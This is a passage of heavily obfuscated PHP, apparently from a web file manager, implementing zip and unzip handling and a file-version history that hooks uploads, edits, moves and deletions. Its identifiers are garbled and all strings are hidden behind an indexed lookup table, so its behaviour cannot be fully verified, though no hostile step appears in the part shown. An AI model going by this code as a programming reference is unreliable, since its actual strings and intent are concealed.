show_json("{$‚‚•´ş}\x20\156\x6f\164\40\x65\x78\151\x73\x74\x73\41", !1); } $¥â®òÔ = isset($Ûğ³—–©[$ÑˆÑîİø[6]]) ? $Ûğ³—–©[$ÑˆÑîİø[6]] : !1; self::$driverCache[$™ÜÆ£”] = new $‚‚•´ş($¥â®òÔ); } $ò˜ŞçÓ¯ = self::$driverCache[$™ÜÆ£”]; $ò˜ŞçÓ¯->pathDriver = $ÀÀí¨®å; $ò˜ŞçÓ¯->pathBase = $ÑˆÑîİø[12]; if (isset($Ûğ³—–©[$ÑˆÑîİø[6]][$ÑˆÑîİø[1365]])) { $ò˜ŞçÓ¯->pathBase = rtrim($Ûğ³—–©[$ÑˆÑîİø[6]][$ÑˆÑîİø[1365]], $ÑˆÑîİø[8]) . $ÑˆÑîİø[8]; $÷‹ñÔ»ê = $ò˜ŞçÓ¯->pathBase . ltrim($÷‹ñÔ»ê, $ÑˆÑîİø[8]); } $÷‹ñÔ»ê = $ò˜ŞçÓ¯->getPath($÷‹ñÔ»ê); if (isset($òµ’âÛó[$ÑˆÑîİø[1333]])) { $÷‹ñÔ»ê = $òµ’âÛó[$ÑˆÑîİø[1333]]; } $ò˜ŞçÓ¯->path = $÷‹ñÔ»ê; return $ò˜ŞçÓ¯; } public static function errorTips($ô³©» = false, $ú”ÍıÍ÷ = true) { $äÖ½”ËÜ =& $_SERVER[œ—üé‹ê]; static $ú¢ËœÊú = array(); $¿¤ËË‘‹ = 100; if ($ô³©» === -1) { return $ú¢ËœÊú ? $ú¢ËœÊú[count($ú¢ËœÊú) - 1] : $äÖ½”ËÜ[12]; } if ($ô³©» === !1) { return implode($äÖ½”ËÜ[285], $ú¢ËœÊú); } if (count($ú¢ËœÊú) >= $¿¤ËË‘‹) { $ú¢ËœÊú = array_slice($ú¢ËœÊú, $¿¤ËË‘‹ * 0.5, $¿¤ËË‘‹); } $ú¢ËœÊú[] = $ô³©»; if (!$ú”ÍıÍ÷) { return; } write_log($äÖ½”ËÜ[173] . ACTION . $äÖ½”ËÜ[1366] . $ô³©», $äÖ½”ËÜ[1367]); } public static function getLastError($®Úƒ¶áÈ = '') { $‡Úôô€Ò = self::errorTips(-1); return $‡Úôô€Ò ? $‡Úôô€Ò : $®Úƒ¶áÈ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ŠšÎ‰í¦; if ($ŠšÎ‰í¦) { return $ŠšÎ‰í¦; } $šºÓµ¥ = IO::init($_SERVER[œ—üé‹ê][8]); return $šºÓµ¥; } private static function iconvSystem($‡‘”„Ä) { return self::local()->iconvSystem($‡‘”„Ä); } private static function iconvApp($Ç‚™Ä•Á) { return self::local()->iconvApp($Ç‚™Ä•Á); } public static function zipFolder($‡Ñ˜¦Â, $ÇÂ¾ˆËã = "\172\x69\160", $€É±ØË× = '', $¢å¢˜Ø = REPEAT_RENAME) { $ÂØàõ =& $_SERVER[œ—üé‹ê]; $Ä’é®Ç½ = IO::listPath($‡Ñ˜¦Â); if (!$Ä’é®Ç½) { return !1; } $Ä’é®Ç½ = array_merge($Ä’é®Ç½[$ÂØàõ[85]], $Ä’é®Ç½[$ÂØàõ[86]]); return self::zip($Ä’é®Ç½, $ÇÂ¾ˆËã, $€É±ØË×, $¢å¢˜Ø); } public static function zip($à¬†°Ÿ°, $Ë¯¯°ƒ = "\x7a\x69\160", $õß™’šÔ = '', $©ÙŸ€  = REPEAT_RENAME) { $Úé—ï÷È =& $_SERVER[œ—üé‹ê]; if (is_string($à¬†°Ÿ°) && $à¬†°Ÿ°) { $à¬†°Ÿ° = array(array($Úé—ï÷È[87] => $à¬†°Ÿ°)); } $”Í„ÈÀ = self::init($à¬†°Ÿ°[0][$Úé—ï÷È[87]]); $°øùÎÕ” = self::info($à¬†°Ÿ°[0][$Úé—ï÷È[87]]); $ƒ®æ¢Æ = $Úé—ï÷È[12]; $á—»ß = $Úé—ï÷È[12]; $ğŸÙ¼½á = $Úé—ï÷È[12]; if ($õß™’šÔ && substr($õß™’šÔ, -1, 1) != $Úé—ï÷È[8]) { $á—»ß = get_path_father($õß™’šÔ); $ğŸÙ¼½á = get_path_this($õß™’šÔ); } else { $á—»ß = self::pathFather($°øùÎÕ”[$Úé—ï÷È[87]]); $ğŸÙ¼½á = $°øùÎÕ”[$Úé—ï÷È[32]] . $Úé—ï÷È[10] . $Ë¯¯°ƒ; if (count($à¬†°Ÿ°) > 1) { $Ä¯¾‡º = IO::info($á—»ß); $ğŸÙ¼½á = $Ä¯¾‡º[$Úé—ï÷È[32]] . $Úé—ï÷È[10] . $Ë¯¯°ƒ; } if ($õß™’šÔ) { $á—»ß = $õß™’šÔ; } } if ($”Í„ÈÀ->getType() == $Úé—ï÷È[106]) { $£µìÇ×š = self::init($á—»ß); $Û§±ôö™ = $£µìÇ×š->getType() == $Úé—ï÷È[106] ? $á—»ß : get_path_father($”Í„ÈÀ->path); $Û§±ôö™ = IO::getPathInner($Û§±ôö™); $Û§±ôö™ = rtrim($Û§±ôö™, $Úé—ï÷È[8]) . $Úé—ï÷È[8]; mk_dir($Û§±ôö™); } else { $ƒ®æ¢Æ = TEMP_FILES . $Úé—ï÷È[1368] . time() . rand_string(8) . $Úé—ï÷È[8]; mk_dir($ƒ®æ¢Æ); file_put_contents($ƒ®æ¢Æ . $Úé—ï÷È[1369], $Úé—ï÷È[12]); $Û§±ôö™ = $ƒ®æ¢Æ; } $÷¬‘ÉÎÁ = IO::info($Û§±ôö™); if (!$÷¬‘ÉÎÁ || !$÷¬‘ÉÎÁ[$Úé—ï÷È[233]]) { show_json(LNG($Úé—ï÷È[1370]), !1); } $¼ÇÕü¦ˆ = self::zipFileList($à¬†°Ÿ°, $ƒ®æ¢Æ); foreach ($¼ÇÕü¦ˆ as $ÁÃÓ×âî => $˜‰Æƒı¨) { $¼ÇÕü¦ˆ[$ÁÃÓ×âî] = self::iconvSystem($˜‰Æƒı¨); } $¥äÕ¨±Á = get_filename_auto($Û§±ôö™ . $ğŸÙ¼½á, $Úé—ï÷È[12], $©ÙŸ€ ); KodArchive::create(self::iconvSystem($¥äÕ¨±Á), $¼ÇÕü¦ˆ); if (!IO::exist($¥äÕ¨±Á)) { if ($ƒ®æ¢Æ) { del_dir($ƒ®æ¢Æ); } write_log($Úé—ï÷È[1371] . $¥äÕ¨±Á, $Úé—ï÷È[388]); show_json(LNG($Úé—ï÷È[1372]), !1); } if (!$ƒ®æ¢Æ) { return $¥äÕ¨±Á; } $ñ¼ö¼ = self::move($¥äÕ¨±Á, $á—»ß, $©ÙŸ€ ); if ($ƒ®æ¢Æ) { del_dir($ƒ®æ¢Æ); } if (!$¥äÕ¨±Á) { write_log($Úé—ï÷È[1373] . $¥äÕ¨±Á . $Úé—ï÷È[1374] . $á—»ß, $Úé—ï÷È[388]); show_json(LNG($Úé—ï÷È[1372]), !1); } return $ñ¼ö¼; } public static function unzip($ô¤°®¯, $îó±º¨Ä, $©ıÜ…Óà = "\55\61", $ ‘Éşø = "\x72\145\160\x6c\141\x63\x65") { $Ô¥œÛï =& $_SERVER[œ—üé‹ê]; $¶Ãø¤Ïå = parent::info($ô¤°®¯); if (!$¶Ãø¤Ïå) { show_json(LNG($Ô¥œÛï[1375]), !1); } $éÀßáÆ = IO::infoFullSimple($îó±º¨Ä); if (!$éÀßáÆ) { $îó±º¨Ä = IO::mkdir($îó±º¨Ä); } if (isset($éÀßáÆ[$Ô¥œÛï[191]]) && trim($éÀßáÆ[$Ô¥œÛï[87]], $Ô¥œÛï[8]) != trim($îó±º¨Ä, $Ô¥œÛï[8])) { $ı‹ÛçÖ = KodIO::make($éÀßáÆ[$Ô¥œÛï[190]]); $äÇ°ÜÎş = IO::fileNameAuto($ı‹ÛçÖ, $éÀßáÆ[$Ô¥œÛï[32]], REPEAT_RENAME_FOLDER, !0); $îó±º¨Ä = IO::mkdir($ı‹ÛçÖ . $äÇ°ÜÎş); } $©ıÜ…Óà = $©ıÜ…Óà && $©ıÜ…Óà != $Ô¥œÛï[1376] ? @json_decode($©ıÜ…Óà, !0) : -1; $…“‚áí“ = self::unzipPart($ô¤°®¯, $©ıÜ…Óà); if (!$…“‚áí“ || !IO::exist($…“‚áí“[$Ô¥œÛï[230]])) { show_json(LNG($Ô¥œÛï[105]), !1); } $Œ´ëÇ À = $…“‚áí“[$Ô¥œÛï[1377]][count($…“‚áí“[$Ô¥œÛï[1377]]) - 1]; if ($Œ´ëÇ À[$Ô¥œÛï[1305]] == -1 || substr($Œ´ëÇ À[$Ô¥œÛï[32]], -1, 1) == $Ô¥œÛï[8]) { $Ç©¶œ¸¦ = $…“‚áí“[$Ô¥œÛï[1378]] . rand_string(10) . $Ô¥œÛï[8]; mk_dir($Ç©¶œ¸¦); $İ‡÷‹ºÅ = count($…“‚áí“[$Ô¥œÛï[1377]]) == 1 ? IO::ext($ô¤°®¯) : get_path_ext($…“‚áí“[$Ô¥œÛï[230]]); $‰Ğì¡°ˆ = KodArchive::extract(self::iconvSystem($…“‚áí“[$Ô¥œÛï[230]]), $Ç©¶œ¸¦, $Œ´ëÇ À[$Ô¥œÛï[1305]], $äÇ°ÜÎş, $İ‡÷‹ºÅ); self::unzipErrorCheck($‰Ğì¡°ˆ, array($Ô¥œÛï[1379], $ô¤°®¯, $İ‡÷‹ºÅ, $îó±º¨Ä, $…“‚áí“)); Hook::trigger($Ô¥œÛï[1380], $Ç©¶œ¸¦); recursion_dir($Ç©¶œ¸¦, $‡óöâÀŠ, $¡ÎÔèôé, 0); $¢ù÷èÑ¡ = array_merge($‡óöâÀŠ, $¡ÎÔèôé); $İÏåœò = array(); foreach ($¢ù÷èÑ¡ as $±‡ÊÖĞ‡) { $«ÌéË£É = IO::move(self::iconvApp($±‡ÊÖĞ‡), $îó±º¨Ä, $ ‘Éşø); if ($«ÌéË£É) { $İÏåœò[] = $«ÌéË£É; } } del_dir($Ç©¶œ¸¦); } else { $«ÌéË£É = IO::move($…“‚áí“[$Ô¥œÛï[230]], $îó±º¨Ä, $ ‘Éşø, get_path_this($Œ´ëÇ À[$Ô¥œÛï[32]])); if ($«ÌéË£É) { $İÏåœò[] = $«ÌéË£É; } } return $İÏåœò ? $İÏåœò : !1; } public static function unzipList($¬Ì­¶”) { $ºÒ¥èï… =& $_SERVER[œ—üé‹ê]; $Ç¦éíŞ© = isset($¬Ì­¶”[$ºÒ¥èï…[1381]]) ? $¬Ì­¶”[$ºÒ¥èï…[1381]] : !1; $Í µ‚ÜÃ = isset($¬Ì­¶”[$ºÒ¥èï…[1305]]) ? @json_decode($¬Ì­¶”[$ºÒ¥èï…[1305]], !0) : -1; $Èò¼ˆ³ı = self::unzipPart($¬Ì­¶”[$ºÒ¥èï…[87]], $Í µ‚ÜÃ); if (!$Èò¼ˆ³ı || !IO::exist($Èò¼ˆ³ı[$ºÒ¥èï…[230]])) { show_json(LNG($ºÒ¥èï…[105]), !1); } $üµÅ¬ø = $Èò¼ˆ³ı[$ºÒ¥èï…[1377]][count($Èò¼ˆ³ı[$ºÒ¥èï…[1377]]) - 1]; $¬³ºÂ×ä = in_array(IO::ext($Èò¼ˆ³ı[$ºÒ¥èï…[230]]), array($ºÒ¥èï…[388], $ºÒ¥èï…[1382], $ºÒ¥èï…[1383], $ºÒ¥èï…[1384], $ºÒ¥èï…[1385], $ºÒ¥èï…[1386])); if (!$Ç¦éíŞ© && ($üµÅ¬ø[$ºÒ¥èï…[1305]] == -1 || $¬³ºÂ×ä)) { $ÛÆ÷ˆÑŠ = $Èò¼ˆ³ı[$ºÒ¥èï…[1378]] . get_path_this($Èò¼ˆ³ı[$ºÒ¥èï…[230]]) . $ºÒ¥èï…[970]; if (!IO::exist($ÛÆ÷ˆÑŠ)) { $¿Ó¨ÒãÑ = $üµÅ¬ø[$ºÒ¥èï…[1305]] == -1 ? get_path_ext(IO::pathThis($¬Ì­¶”[$ºÒ¥èï…[87]])) : get_path_ext($Èò¼ˆ³ı[$ºÒ¥èï…[230]]); $“ÎÅˆé„ = KodArchive::listContent(self::iconvSystem($Èò¼ˆ³ı[$ºÒ¥èï…[230]]), !0, $¿Ó¨ÒãÑ); self::unzipErrorCheck($“ÎÅˆé„, array($ºÒ¥èï…[1387], $¬Ì­¶”, $Èò¼ˆ³ı)); @file_put_contents($ÛÆ÷ˆÑŠ, json_encode($“ÎÅˆé„[$ºÒ¥èï…[1388]])); } return @json_decode(IO::getContent($ÛÆ÷ˆÑŠ), !0); } IO::fileOut($Èò¼ˆ³ı[$ºÒ¥èï…[230]], $Ç¦éíŞ©, get_path_this($üµÅ¬ø[$ºÒ¥èï…[32]])); die; } private static function zipFileList($Œòš„ö˜, $Ÿ¢ïÅÙÖ = false) { $û•ØÏ«¨ =& $_SERVER[œ—üé‹ê]; $Ûç§´€Ø = array(); foreach ($Œòš„ö˜ as $Â›Ì¡°) { $ğ·øü§ = $Â›Ì¡°[$û•ØÏ«¨[87]]; if ($Ÿ¢ïÅÙÖ) { $ğ·øü§ = self::copy($Â›Ì¡°[$û•ØÏ«¨[87]], $Ÿ¢ïÅÙÖ, $û•ØÏ«¨[936]); } else { $ôŸ¼õä° = self::init($Â›Ì¡°[$û•ØÏ«¨[87]]); if ($ôŸ¼õä°->getType() == $û•ØÏ«¨[106]) { $ğ·øü§ = $ôŸ¼õä°->path; } } if ($ğ·øü§ && self::local()->exist($ğ·øü§)) { $Ûç§´€Ø[$Â›Ì¡°[$û•ØÏ«¨[87]]] = $ğ·øü§; } } if (!empty($Ûç§´€Ø)) { return array_values($Ûç§´€Ø); } show_json(LNG($û•ØÏ«¨[1347]), !1); } private static function localFilePath($±ƒ¬ó·ß) { $©ò’Ùµ¿ =& $_SERVER[œ—üé‹ê]; $§èŒæª´ = KodIO::parse($±ƒ¬ó·ß); if ($§èŒæª´[$©ò’Ùµ¿[33]] == KodIO::KOD_SOURCE) { $ßÍ¡ç£¯ = Model($©ò’Ùµ¿[942])->fileInfoGet(KodIO::sourceID($±ƒ¬ó·ß)); if (!$ßÍ¡ç£¯[$©ò’Ùµ¿[87]]) { show_json($©ò’Ùµ¿[1389], !1); } $±ƒ¬ó·ß = $ßÍ¡ç£¯[$©ò’Ùµ¿[87]]; } $Á”Á’Øï = self::init($±ƒ¬ó·ß); if ($Á”Á’Øï->pathParse[$©ò’Ùµ¿[1333]]) { $±ƒ¬ó·ß = $Á”Á’Øï->pathParse[$©ò’Ùµ¿[1333]]; $Á”Á’Øï = self::init($±ƒ¬ó·ß); } $üÇºªà = $Á”Á’Øï->getType(); if ($üÇºªà == $©ò’Ùµ¿[106] || $üÇºªà == $©ò’Ùµ¿[1390]) { if (!$Á”Á’Øï->exist($Á”Á’Øï->path)) { show_json(LNG($©ò’Ùµ¿[105]), !1); } return $Á”Á’Øï->path; } return !1; } public static function unzipPart($…şÄ««Ù, $ê‚—¶´Ö = -1) { $ÛÂ› =& $_SERVER[œ—üé‹ê]; $ûøËã·Ö = IO::pathThis($…şÄ««Ù); if (!$ê‚—¶´Ö || $ê‚—¶´Ö == -1) { $¶†·Ä¯× = array(array($ÛÂ›[32] => $ûøËã·Ö, $ÛÂ›[1305] => -1)); $¶†·Ä¯×[0][$ÛÂ›[1391]] = $¶†·Ä¯×[0][$ÛÂ›[32]]; } else { if (is_array($ê‚—¶´Ö)) { $¶†·Ä¯× = $ê‚—¶´Ö; $´î§×–ù = count($¶†·Ä¯×) - 1; for ($Õ®Ó«…ğ = 0; $Õ®Ó«…ğ <= $´î§×–ù; $Õ®Ó«…ğ++) { $»Ë½üéı = $¶†·Ä¯×[$Õ®Ó«…ğ]; $ÃÏÇî‘ = get_path_this($»Ë½üéı[$ÛÂ›[32]]) . (checkExtSafe($»Ë½üéı[$ÛÂ›[32]]) ? $ÛÂ›[12] : $ÛÂ›[1392]); $¶†·Ä¯×[$Õ®Ó«…ğ][$ÛÂ›[1391]] = $ÛÂ›[1393] . intval($»Ë½üéı[$ÛÂ›[1305]]) . $ÛÂ›[476] . $ÃÏÇî‘; if ($Õ®Ó«…ğ == 0) { continue; } $¶†·Ä¯×[$Õ®Ó«…ğ][$ÛÂ›[1391]] = $¶†·Ä¯×[$Õ®Ó«…ğ - 1][$ÛÂ›[1391]] . $ÛÂ›[1394] . $¶†·Ä¯×[$Õ®Ó«…ğ][$ÛÂ›[1391]]; } } } if (!is_array($¶†·Ä¯×) || count($¶†·Ä¯×) == 0) { return !1; } $¸°›¶Êí = $¶†·Ä¯×[count($¶†·Ä¯×) - 1]; if (!IO::exist($…şÄ««Ù)) { return !1; } $Ö¦²ìï = TEMP_FILES . $ÛÂ›[1395] . kodIO::hashPathSafe($…şÄ««Ù) . $ÛÂ›[8]; $’Î¶´‡ô = $Ö¦²ìï . $¸°›¶Êí[$ÛÂ›[1391]]; mk_dir($Ö¦²ìï); file_put_contents(TEMP_FILES . $ÛÂ›[1369], $ÛÂ›[12]); if (IO::exist($’Î¶´‡ô)) { return array($ÛÂ›[230] => $’Î¶´‡ô, $ÛÂ›[1377] => $¶†·Ä¯×, $ÛÂ›[1378] => $Ö¦²ìï); } $½í–¶—Ê = self::localFilePath($…şÄ««Ù); if (!$½í–¶—Ê) { $½í–¶—Ê = $Ö¦²ìï . $ÛÂ›[1396]; if (!IO::exist($½í–¶—Ê)) { self::copy($…şÄ««Ù, $Ö¦²ìï, !1, get_path_this($½í–¶—Ê)); } } if (!$½í–¶—Ê || !IO::exist($½í–¶—Ê)) { return !1; } if ($¸°›¶Êí[$ÛÂ›[1305]] == -1) { return array($ÛÂ›[230] => $½í–¶—Ê, $ÛÂ›[1377] => $¶†·Ä¯×, $ÛÂ›[1378] => $Ö¦²ìï); } $Ÿ²„€à’ = $½í–¶—Ê; foreach ($¶†·Ä¯× as $Õ®Ó«…ğ => $»Ë½üéı) { if (!$»Ë½üéı || $»Ë½üéı[$ÛÂ›[1305]] == $ÛÂ›[1376]) { break; } if (substr($»Ë½üéı[$ÛÂ›[32]], -1, 1) == $ÛÂ›[8]) { break; } $İÓ·¼Ø“ = in_array(get_path_ext($»Ë½üéı[$ÛÂ›[1391]]), array($ÛÂ›[388], $ÛÂ›[1382], $ÛÂ›[1383], $ÛÂ›[1384], $ÛÂ›[1385], $ÛÂ›[1386])); $¬²¦ˆòµ = $Õ®Ó«…ğ == count($¶†·Ä¯×) - 1 && $İÓ·¼Ø“; $ì“î„ › = $Ö¦²ìï . $»Ë½üéı[$ÛÂ›[1391]]; $¡İĞà”¡ = $Ö¦²ìï . get_path_this($»Ë½üéı[$ÛÂ›[32]]); if (IO::exist($ì“î„ ›)) { $Ÿ²„€à’ = $ì“î„ ›; continue; } $œ¯Ó…Ô¹ = $Õ®Ó«…ğ == 0 ? get_path_ext($ûøËã·Ö) : get_path_ext($Ÿ²„€à’); $ü¨ıÆÄº = KodArchive::extract(self::iconvSystem($Ÿ²„€à’), $Ö¦²ìï, $»Ë½üéı[$ÛÂ›[1305]], $ µâ÷üµ, $œ¯Ó…Ô¹); self::unzipErrorCheck($ü¨ıÆÄº, array($ÛÂ›[1397], $…şÄ««Ù, $¶†·Ä¯×, $»Ë½üéı, $ì“î„ ›)); if (IO::exist($¡İĞà”¡)) { IO::rename($¡İĞà”¡, get_path_this($ì“î„ ›)); } $Ÿ²„€à’ = $ì“î„ ›; } $’Î¶´‡ô = $Ÿ²„€à’; return array($ÛÂ›[230] => $Ÿ²„€à’, $ÛÂ›[1377] => $¶†·Ä¯×, $ÛÂ›[1378] => $Ö¦²ìï); } private static function unzipErrorCheck($‹×³ñÍÔ, $ÚàÛëàø = false) { $Àôá¨‚³ =& $_SERVER[œ—üé‹ê]; if ($‹×³ñÍÔ[$Àôá¨‚³[1398]]) { return !0; } write_log(array($Àôá¨‚³[1399], $‹×³ñÍÔ, $ÚàÛëàø), $Àôá¨‚³[1400]); $¼ÕšÙ·œ = is_array($‹×³ñÍÔ[$Àôá¨‚³[1388]]) ? json_encode($‹×³ñÍÔ[$Àôá¨‚³[1388]]) : $‹×³ñÍÔ[$Àôá¨‚³[1388]]; show_json($Àôá¨‚³[1401] . $¼ÕšÙ·œ, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $É”À¸ùÉ =& $_SERVER[œ—üé‹ê]; $ñêÇš = $GLOBALS[$É”À¸ùÉ[6]][$É”À¸ùÉ[92]]; if ($ñêÇš[$É”À¸ùÉ[1402]] != 1) { return; } if ($ñêÇš[$É”À¸ùÉ[1403]] <= 0) { return; } if (isset($_REQUEST[$É”À¸ùÉ[1404]]) && $_REQUEST[$É”À¸ùÉ[1404]] == $É”À¸ùÉ[91]) { return; } Hook::bind($É”À¸ùÉ[1405], $É”À¸ùÉ[1406]); Hook::bind($É”À¸ùÉ[1407], $É”À¸ùÉ[1408]); Hook::bind($É”À¸ùÉ[1409], $É”À¸ùÉ[1410]); Hook::bind($É”À¸ùÉ[1411], $É”À¸ùÉ[1412]); Hook::bind($É”À¸ùÉ[1413], $É”À¸ùÉ[1414]); Hook::bind($É”À¸ùÉ[1415], $É”À¸ùÉ[1416]); } public static function eventBeforeUpload($ÁÛ÷Õ„) { if ($ÁÛ÷Õ„[3] && $ÁÛ÷Õ„[3] != REPEAT_REPLACE) { return; } $Å”Àş´½ = self::parsePath($ÁÛ÷Õ„[0]); if (!$Å”Àş´½) { return; } self::add($Å”Àş´½); } public static function eventBeforeEdit($’Ø¾†–) { $»ÆßğÁ = self::parsePath($’Ø¾†–[0]); if (!$»ÆßğÁ) { return; } self::add($»ÆßğÁ); } public static function eventBeforeCopyFile($şÃ¢ëí, $Ã”ä¿Ï, $±ßƒ¼üÆ, $úı´±ÄÖ, $Ì¦êÑ¼·, $İäÇî½‰) { $™ü÷¼§ =& $_SERVER[œ—üé‹ê]; if (isset($±ßƒ¼üÆ->_data[$™ü÷¼§[1337]]) && $±ßƒ¼üÆ->_data[$™ü÷¼§[1337]]) { return; } $Ó´œ£Òë = $±ßƒ¼üÆ->getPathOuter($úı´±ÄÖ); $½›¢öÅ = self::parsePath($Ó´œ£Òë); if (!$½›¢öÅ) { return; } self::add($½›¢öÅ); } public static function eventBeforeRename($¦ÕÙ„û) { $­Ğ™†Ã¨ =& $_SERVER[œ—üé‹ê]; $ÚÛîÀ¬ø = self::parsePath($¦ÕÙ„û[0]); if (!$ÚÛîÀ¬ø) { return; } $İ¼Ñ¶ = self::checkInHistory($ÚÛîÀ¬ø); if (!$İ¼Ñ¶) { return; } if ($İ¼Ñ¶[$­Ğ™†Ã¨[33]] == $­Ğ™†Ã¨[230]) { $ù±´œ¥Ğ = self::listData($ÚÛîÀ¬ø); if ($ù±´œ¥Ğ && $ù±´œ¥Ğ[$­Ğ™†Ã¨[446]]) { self::moveHistory($ÚÛîÀ¬ø, $¦ÕÙ„û[1]); } } else { IO::rename($İ¼Ñ¶[$­Ğ™†Ã¨[87]], $¦ÕÙ„û[1]); } } public static function eventBeforeMove($­¥·ïªÂ) { $Ã¾¤ØÏÂ =& $_SERVER[œ—üé‹ê]; $ßÅêşÉÀ = self::parsePath($­¥·ïªÂ[0]); if (!$ßÅêşÉÀ) { return; } $æ÷ØáÜ¹ = self::parsePath($­¥·ïªÂ[1]); if (!$æ÷ØáÜ¹) { return; } $ËÉ„¹¼× = $­¥·ïªÂ[3]; $Â½şÉ¦İ = self::checkInHistory($ßÅêşÉÀ); if (!$Â½şÉ¦İ) { return; } $—Ñª‘“¦ = self::pathHistory($æ÷ØáÜ¹); if ($Â½şÉ¦İ[$Ã¾¤ØÏÂ[33]] == $Ã¾¤ØÏÂ[230]) { $ä¼Šñš = self::listData($ßÅêşÉÀ); $‡”íş = rtrim($æ÷ØáÜ¹, $Ã¾¤ØÏÂ[8]) . $Ã¾¤ØÏÂ[8] . ($ËÉ„¹¼× ? $ËÉ„¹¼× : get_path_this($ßÅêşÉÀ)); $àñõşğÂ = self::listData($‡”íş); if ($ä¼Šñš && $ä¼Šñš[$Ã¾¤ØÏÂ[446]] && $àñõşğÂ && $àñõşğÂ[$Ã¾¤ØÏÂ[446]]) { return self::clear($ßÅêşÉÀ); } if ($ä¼Šñš && $ä¼Šñš[$Ã¾¤ØÏÂ[446]]) { self::moveHistory($ßÅêşÉÀ, $ËÉ„¹¼×, $—Ñª‘“¦); } } else { IO::move($Â½şÉ¦İ[$Ã¾¤ØÏÂ[87]], $—Ñª‘“¦, !1, $ËÉ„¹¼×); self::clearEmptyFolder(IO::pathFather($Â½şÉ¦İ[$Ã¾¤ØÏÂ[87]])); } } public static function eventAfterRemove($ş¸­»¯, $”¥²‘œÚ) { $’ƒ£¸üß =& $_SERVER[œ—üé‹ê]; if (!$”¥²‘œÚ) { return; } $ÆĞ¼ŸÈÎ = self::parsePath($ş¸­»¯[0]); if (!$ÆĞ¼ŸÈÎ) { return; } $’öÃÖÃ· = self::checkInHistory($ÆĞ¼ŸÈÎ); if (!$’öÃÖÃ·) { return; } if ($’öÃÖÃ·[$’ƒ£¸üß[33]] == $’ƒ£¸üß[230]) { $Í¸ÊÓÈ­ = self::listData($ÆĞ¼ŸÈÎ, !1); if ($Í¸ÊÓÈ­ && $Í¸ÊÓÈ­[$’ƒ£¸üß[446]]) { self::clear($ÆĞ¼ŸÈÎ, !1); } } else { IO::remove($’öÃÖÃ·[$’ƒ£¸üß[87]]); self::clearEmptyFolder(IO::pathFather($’öÃÖÃ·[$’ƒ£¸üß[87]])); } } private static function checkInHistory($Ø˜İÉü­) { $†è’˜ˆ = self::pathHistory($Ø˜İÉü­); if (!IO::exist($†è’˜ˆ)) { $†è’˜ˆ .= $_SERVER[œ—üé‹ê][1417]; } return IO::exist($†è’˜ˆ) ? IO::info($†è’˜ˆ) : !1; } private static function parsePath($òÖÉ¦Ù–) { $Û£Ğã‡â =& $_SERVER[œ—üé‹ê]; if (!$òÖÉ¦Ù–) { return !1; } if (isset($GLOBALS[$Û£Ğã‡â[1418]]) && $GLOBALS[$Û£Ğã‡â[1418]]) { return; } $°¹ºÃ¸³ = KodIO::parse($òÖÉ¦Ù–); $¯‡Ï¬¯Â = $°¹ºÃ¸³[$Û£Ğã‡â[33]]; $åÉİÚ° = !$¯‡Ï¬¯Â || $¯‡Ï¬¯Â == KodIO::KOD_IO || $¯‡Ï¬¯Â == KodIO::KOD_SHARE_ITEM; if (!$åÉİÚ° || !$°¹ºÃ¸³[$Û£Ğã‡â[1419]]) { return !1; } if (substr($òÖÉ¦Ù–, 0, strlen(DATA_PATH . $Û£Ğã‡â[1420])) == DATA_PATH . $Û£Ğã‡â[1420]) { return !1; } if ($¯‡Ï¬¯Â == KodIO::KOD_SHARE_ITEM) { $±ìø š = IO::init($òÖÉ¦Ù–); if ($±ìø š->pathParse[$Û£Ğã‡â[1333]]) { return self::parsePath($±ìø š->pathParse[$Û£Ğã‡â[1333]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $õ­•µíÅ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $Û£Ğã‡â[1421]); foreach ($õ­•µíÅ as $ÊÙ´Ò˜î) { if (!$¯‡Ï¬¯Â && substr($òÖÉ¦Ù–, 0, strlen($ÊÙ´Ò˜î)) == $ÊÙ´Ò˜î) { return !1; } } self::log($GLOBALS[$Û£Ğã‡â[1327]] . $Û£Ğã‡â[1422] . $òÖÉ¦Ù–); return $òÖÉ¦Ù–; } private static function pathHistory($–œõ¬Ï›) { $÷„¡î½ß =& $_SERVER[œ—üé‹ê]; $“æ‰ßÑ¸ = self::$_historyBase . ltrim(KodIO::clear($–œõ¬Ï›), $÷„¡î½ß[8]); $“æ‰ßÑ¸ = str_replace(array($÷„¡î½ß[1423]), array($÷„¡î½ß[1424]), $“æ‰ßÑ¸); return $“æ‰ßÑ¸; } public static function log($Ç×³‘Î) { } public static function historyCount($í«Ûú–) { $éó¥ÍÂ =& $_SERVER[œ—üé‹ê]; $¡Ö½º = array(); $×»Ÿ›¢Î = array(); foreach ($í«Ûú– as $ı·Ÿ¶ˆ÷) { $½ˆ®ÍíØ = get_path_father($ı·Ÿ¶ˆ÷); if (!$×»Ÿ›¢Î[$½ˆ®ÍíØ]) { $×»Ÿ›¢Î[$½ˆ®ÍíØ] = array(); } $×»Ÿ›¢Î[$½ˆ®ÍíØ][] = get_path_this($ı·Ÿ¶ˆ÷); } foreach ($×»Ÿ›¢Î as $½ˆ®ÍíØ => $Æ²Äá¾¾) { $ˆù²™ış = self::parsePath($½ˆ®ÍíØ); if (!$ˆù²™ış) { continue; } foreach ($Æ²Äá¾¾ as $ÍÜªÕ×À) { $°ÂÙ¦²ó = self::listData(rtrim($ˆù²™ış, $éó¥ÍÂ[8]) . $éó¥ÍÂ[8] . $ÍÜªÕ×À, !1); if ($°ÂÙ¦²ó && $°ÂÙ¦²ó[$éó¥ÍÂ[446]]) { $¡Ö½º[rtrim($½ˆ®ÍíØ, $éó¥ÍÂ[8]) . $éó¥ÍÂ[8] . $ÍÜªÕ×À] = count($°ÂÙ¦²ó[$éó¥ÍÂ[446]]); } } } return $¡Ö½º; } public static function add($¥‚±·Üô) { $ö²¢Ä¯‚ =& $_SERVER[œ—üé‹ê]; $Ó×®İáÊ = self::listData($¥‚±·Üô); if (!$Ó×®İáÊ) { return; } $Üìúï×† = Model($ö²¢Ä¯‚[882])->get($ö²¢Ä¯‚[971]); $ß”âßù« = intval($GLOBALS[$ö²¢Ä¯‚[6]][$ö²¢Ä¯‚[92]][$ö²¢Ä¯‚[1403]]); $ª‰Òƒù¶ = $Üìúï×† == $ö²¢Ä¯‚[972] ? min(5, $ß”âßù«) : $ß”âßù«; if ($ß”âßù« <= 0) { return; } $›¹Õ÷¸¿ = IO::info($¥‚±·Üô); $ÈØÏÇŞğ = $Ó×®İáÊ[$ö²¢Ä¯‚[446]]; 